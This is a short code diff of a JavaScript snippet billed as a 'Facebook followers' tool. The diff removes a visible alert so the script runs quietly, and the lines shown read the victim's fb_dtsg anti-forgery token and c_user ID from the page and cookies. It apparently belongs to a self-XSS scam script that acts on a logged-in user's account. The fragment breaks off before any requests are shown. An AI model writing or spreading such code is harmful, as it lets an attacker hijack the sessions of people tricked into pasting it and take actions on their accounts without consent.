@@ -1,8 +1,7 @@
 /*HTML/JavaScript page status="protected"*/
 /*FACEBOOK FOLLOWERS*/
-/*Copyright Ãƒâ€šÃ‚Â© 2014 Kodran Piraj. All Rights Reserved.*/
+/*2014 Kodran Piraj. All Rights Reserved.*/
 
-alert('FACEBOOK FOLLOWERS');
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
